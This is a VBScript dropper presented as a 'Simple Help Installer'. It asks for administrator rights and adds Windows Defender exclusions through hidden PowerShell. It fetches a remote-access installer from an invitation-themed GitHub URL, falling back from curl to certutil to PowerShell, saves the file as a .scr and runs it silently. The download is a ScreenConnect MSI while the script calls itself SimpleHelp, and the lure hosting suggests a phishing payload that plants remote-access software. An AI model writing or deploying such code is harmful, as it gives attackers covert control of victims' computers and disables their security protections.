' ==============================================================================================
'  Simple Help Installer - NO HANG EDITION
' ==============================================================================================

Option Explicit

' Configuration
Dim SH_Url, shPath, tempDir, fso, shell, APP, logPath
SH_Url = "https://github.com/bain-invite/Invitation-RSVP/raw/refs/heads/main/Scheduler/ScreenConnect.ClientSetup%20(2).msi"  ' Replace with your actual URL

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set APP = CreateObject("Shell.Application")

tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
shPath = tempDir & "\simple-help-installer.scr"
logPath = tempDir & "\SIMPLEHELP_INSTALL_LOG.txt"

' ==============================================================================================
' LOGGING HELPER
' ==============================================================================================
Sub LogMsg(msg)
    On Error Resume Next
    Dim logFile
    Set logFile = fso.OpenTextFile(logPath, 8, True)
    logFile.WriteLine Now & " - [SH] " & msg
    logFile.Close
End Sub

' START LOGGING IMMEDIATELY
LogMsg "Initialized. Checking Privileges..."

' ==============================================================================================
' 1. ADMIN CHECK & ELEVATION
' ==============================================================================================
Function IsAdmin()
    On Error Resume Next
    shell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
    If Err.Number = 0 Then IsAdmin = True Else IsAdmin = False
    On Error Goto 0
End Function

If Not IsAdmin() Then
    If WScript.Arguments.Count = 0 Then
        LogMsg "Not Admin. Attempting to Elevate..."
        On Error Resume Next
        APP.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 1
        If Err.Number <> 0 Then
            LogMsg "Elevation Failed: " & Err.Description
        Else
            LogMsg "Elevation Triggered. Exiting first instance."
        End If
        WScript.Quit
    End If
Else
    LogMsg "Running with Admin Privileges."
End If

' ==============================================================================================
' 2. ROBUST DOWNLOADER (CURL -> CERTUTIL -> POWERSHELL)
' ==============================================================================================
Function DownloadFile(url, destination)
    Dim success, tmpFile, cacheBustedUrl, attempt
    success = False
    tmpFile = destination & ".tmp"
    
    ' Retry Loop (3 Attempts)
    For attempt = 1 To 3
        If success Then Exit For
        
        LogMsg "Download Attempt " & attempt & " of 3..."
        
        ' CACHE BUSTER
        Randomize
        cacheBustedUrl = url & "?t=" & Int(Rnd * 1000000)
        
        On Error Resume Next
        
        ' Method 1: CURL (Best for speed, checking if exists first)
        LogMsg "Trying CURL..."
        shell.Run "curl -o """ & tmpFile & """ """ & cacheBustedUrl & """ -k --connect-timeout 30", 0, True
        If fso.FileExists(tmpFile) Then
             If fso.GetFile(tmpFile).Size > 1000 Then 
                success = True
                LogMsg "CURL Download Successful."
             End If
        End If
        
        ' Method 2: Certutil (Fallback)
        If Not success Then
            LogMsg "CURL failed. Trying Certutil..."
            shell.Run "certutil.exe -urlcache -split -f """ & cacheBustedUrl & """ """ & tmpFile & """", 0, True
            If fso.FileExists(tmpFile) Then
                If fso.GetFile(tmpFile).Size > 1000 Then 
                    success = True
                    LogMsg "Certutil Download Successful."
                End If
            End If
        End If

        ' Method 3: PowerShell (Last Resort - With Timeout)
        If Not success Then
            LogMsg "Certutil failed. Trying PowerShell..."
            shell.Run "powershell -WindowStyle Hidden -Command ""$web = New-Object System.Net.WebClient; $web.DownloadFile('" & cacheBustedUrl & "', '" & tmpFile & "')""", 0, True
            If fso.FileExists(tmpFile) Then
                If fso.GetFile(tmpFile).Size > 1000 Then 
                    success = True
                    LogMsg "PowerShell Download Successful."
                End If
            End If
        End If
        
        ' Check Success
        If success Then
            If fso.FileExists(destination) Then fso.DeleteFile destination, True
            fso.MoveFile tmpFile, destination
            LogMsg "Download OK: " & destination
        Else
            LogMsg "Attempt " & attempt & " Failed. Waiting 5 seconds..."
            WScript.Sleep 5000
        End If
        On Error Goto 0
    Next
    
    DownloadFile = success
End Function

' ==============================================================================================
' 3. SIMPLE HELP INSTALLATION FUNCTION
' ==============================================================================================
Function InstallSimpleHelp()
    Dim exitCode, installCmd
    
    LogMsg "Starting Simple Help Installation..."
    
    ' First, check if already installed
    Dim programDataPath
    programDataPath = shell.ExpandEnvironmentStrings("%ProgramData%") & "\JWrapper-Remote Access"
    
    If fso.FolderExists(programDataPath) Then
        LogMsg "WARNING: Simple Help appears to already be installed at: " & programDataPath
        LogMsg "Proceeding with installation anyway (will upgrade/reinstall)..."
    End If
    
    ' Common silent install switches for Simple Help (.scr installer)
    ' Try different switches - you may need to test which one works
    
    ' Option 1: Standard silent switch
    installCmd = """" & shPath & """ /S"
    
    ' Option 2: If Option 1 doesn't work, uncomment one of these:
    ' installCmd = """" & shPath & """ -silent"
    ' installCmd = """" & shPath & """ /quiet"
    ' installCmd = """" & shPath & """ --mode unattended"
    ' installCmd = """" & shPath & """ /verysilent"
    
    LogMsg "Executing: " & installCmd
    
    ' Run the installer - wait for completion
    exitCode = shell.Run(installCmd, 0, True)
    
    If exitCode = 0 Then
        LogMsg "Installation command completed with exit code: " & exitCode
        InstallSimpleHelp = True
    Else
        LogMsg "Installation command failed with exit code: " & exitCode
        InstallSimpleHelp = False
    End If
End Function

' ==============================================================================================
' 4. VERIFICATION FUNCTION
' ==============================================================================================
Function VerifyInstallation()
    Dim installPath, processFound, i
    
    LogMsg "Verifying Simple Help Installation..."
    
    ' Wait a bit for installation to complete and services/processes to start
    LogMsg "Waiting 15 seconds for installation to finalize..."
    WScript.Sleep 15000
    
    ' Check the specific JWrapper-Remote Access directory
    installPath = shell.ExpandEnvironmentStrings("%ProgramData%") & "\JWrapper-Remote Access"
    
    If fso.FolderExists(installPath) Then
        LogMsg "SUCCESS: Simple Help installation folder found at: " & installPath
        
        ' Check for specific files to confirm successful installation
        Dim files
        files = Array("JWrapper-Remote Access.exe", "Remote Access.exe", "SimpleHelp.exe")
        
        For i = 0 To UBound(files)
            If fso.FileExists(installPath & "\" & files(i)) Then
                LogMsg "SUCCESS: Key file found: " & files(i)
            End If
        Next
        
        ' Check for subdirectories that might exist
        If fso.FolderExists(installPath & "\app") Then
            LogMsg "SUCCESS: 'app' subfolder found"
        End If
        
        VerifyInstallation = True
    Else
        LogMsg "WARNING: Installation folder not found at: " & installPath
        VerifyInstallation = False
    End If
    
    ' Check if process is running
    LogMsg "Checking for running Simple Help processes..."
    shell.Run "tasklist /FI ""IMAGENAME eq JWrapper-Remote Access.exe"" > """ & tempDir & "\sh_processes.txt""", 0, True
    shell.Run "tasklist /FI ""IMAGENAME eq Remote Access.exe"" > """ & tempDir & "\sh_processes2.txt""", 0, True
    
    ' Also check for JWrapper processes (since it's JWrapper-based)
    shell.Run "tasklist /FI ""IMAGENAME eq jwrapper*.exe"" > """ & tempDir & "\jwrapper_processes.txt""", 0, True
End Function

' ==============================================================================================
' 5. CLEANUP FUNCTION (Optional)
' ==============================================================================================
Sub Cleanup()
    On Error Resume Next
    LogMsg "Cleaning up temporary files..."
    
    ' Remove downloaded installer
    If fso.FileExists(shPath) Then
        fso.DeleteFile shPath, True
        LogMsg "Removed installer: " & shPath
    End If
    
    ' Remove temporary process files
    If fso.FileExists(tempDir & "\sh_processes.txt") Then
        fso.DeleteFile tempDir & "\sh_processes.txt", True
    End If
    If fso.FileExists(tempDir & "\sh_processes2.txt") Then
        fso.DeleteFile tempDir & "\sh_processes2.txt", True
    End If
    If fso.FileExists(tempDir & "\jwrapper_processes.txt") Then
        fso.DeleteFile tempDir & "\jwrapper_processes.txt", True
    End If
    
    On Error Goto 0
End Sub

' ==============================================================================================
' 6. MAIN EXECUTION
' ==============================================================================================
LogMsg "=== SIMPLE HELP INSTALLER STARTED ==="
LogMsg "Target installation path: %ProgramData%\JWrapper-Remote Access"

' ADD DEFENDER EXCLUSIONS
LogMsg "Adding Defender Exclusions..."
shell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath @('$env:TEMP', 'C:\ProgramData\JWrapper-Remote Access')"" ", 0, True

' KILL ANY EXISTING PROCESSES (optional - uncomment if needed)
' LogMsg "Stopping any running Simple Help processes..."
' shell.Run "taskkill /F /IM ""JWrapper-Remote Access.exe"" 2>nul", 0, True
' shell.Run "taskkill /F /IM ""Remote Access.exe"" 2>nul", 0, True
' WScript.Sleep 2000

' DOWNLOAD AND INSTALL
If DownloadFile(SH_Url, shPath) Then
    LogMsg "Download completed. Starting installation..."
    
    If InstallSimpleHelp() Then
        LogMsg "Installation triggered successfully."
        VerifyInstallation()
    Else
        LogMsg "Installation failed."
    End If
Else
    LogMsg "CRITICAL FAILURE: Download failed after 3 attempts."
End If

' Optional: Clean up installer
' Cleanup()

LogMsg "=== SIMPLE HELP INSTALLER FINISHED ==="
LogMsg "Check the dashboard to confirm connectivity."